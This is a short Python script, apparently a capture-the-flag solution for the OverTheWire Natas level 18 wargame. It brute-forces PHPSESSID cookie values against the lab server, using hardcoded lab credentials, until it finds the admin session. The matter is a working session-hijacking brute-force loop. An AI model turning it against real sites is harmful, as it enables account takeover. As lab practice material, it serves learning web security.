import requests

print("Working...")
for i in range(1, 641):
  r = requests.get(
    'http://natas18.natas.labs.overthewire.org', 
    auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
    cookies={"PHPSESSID" : str(i)}
  )
  if "regular user" not in r.text:
    print("\nSuccess!")
    print("User " + str(i) + " is an admin.")
    break
  


